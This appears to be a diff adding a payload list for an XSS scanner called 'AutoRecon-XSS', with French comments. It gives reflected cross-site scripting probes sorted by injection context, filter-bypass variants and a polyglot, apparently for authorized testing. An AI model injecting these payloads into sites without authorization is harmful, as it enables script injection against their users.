@@ -1,0 +1,64 @@
+# AutoRecon-XSS — sondes de contournement par contexte (reflected / echo).
+# Format : payload<TAB>contexts (html-body, tag, attribute, javascript, html-comment)
+# PROBE est remplacé par un marqueur aléatoire ; une sonde qui ressort VERBATIM
+# dans le bon contexte = ce vecteur passe le filtre à cet endroit.
+# Adapté de PayloadsAllTheThings (swisskyrepo) + OWASP/PortSwigger.
+# Usage autorisé uniquement.
+
+# --- html-body / tag : ouverture de balise directe ---
+<svg/onload=PROBE>	html-body,tag
+<img src=x onerror=PROBE>	html-body,tag
+<svg><script>PROBE</script>	html-body
+<details/open/ontoggle=PROBE>	html-body,tag
+<marquee/onstart=PROBE>	html-body,tag
+<video><source onerror=PROBE>	html-body,tag
+<audio src=x onerror=PROBE>	html-body,tag
+<meter value=2 min=0 max=10 onmouseover=PROBE>x</meter>	html-body,tag
+<body onpageshow=PROBE>	html-body,tag
+<xss/onpointerover=PROBE>	html-body,tag
+<input autofocus onfocus=PROBE>	html-body,tag
+<select autofocus onfocus=PROBE>	html-body,tag
+<textarea autofocus onfocus=PROBE>	html-body,tag
+
+# --- attribute : casser une valeur d'attribut ---
+"><svg/onload=PROBE>	attribute
+'><svg/onload=PROBE>	attribute
+" autofocus onfocus=PROBE x="	attribute
+' autofocus onfocus=PROBE x='	attribute
+"onmouseover="PROBE	attribute
+"accesskey=X onclick=PROBE "	attribute
+"style=animation-name:x onanimationstart=PROBE "	attribute
+
+# --- tag : déjà à l'intérieur d'une balise ouverte ---
+ onload=PROBE	tag
+ autofocus onfocus=PROBE	tag
+ src=x onerror=PROBE	tag
+ ontoggle=PROBE open	tag
+
+# --- javascript : sortir d'une chaîne / contexte JS ---
+';PROBE;//	javascript
+";PROBE;//	javascript
+'-PROBE-'	javascript
+"-PROBE-"	javascript
+`;PROBE;//	javascript
+</script><svg/onload=PROBE>	javascript
+
+# --- html-comment : sortir d'un commentaire ---
+--><svg/onload=PROBE>	html-comment
+--!><svg/onload=PROBE>	html-comment
+
+# --- bypass : doublage de mots-clés (filtres non récursifs) ---
+<scr<script>ipt>PROBE</scr</script>ipt>	html-body
+<img src=x oneonerrorrror=PROBE>	html-body,tag
+<<script>PROBE//<</script>	html-body
+
+# --- bypass : casse / encodage de l'event ---
+<IMG SRC=x ONERROR=PROBE>	html-body,tag
+<sVg OnLoad=PROBE>	html-body,tag
+
+# --- mutation XSS (noscript / backtick) ---
+<noscript><p title="</noscript><img src=x onerror=PROBE>">	html-body
+<details/open/ontoggle=PROBE>	html-body,tag
+
+# --- polyglot (tente plusieurs contextes d'un coup) ---
+javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/PROBE/+/`/+/onmouseover=1/>	html-body,attribute,javascript,html-comment
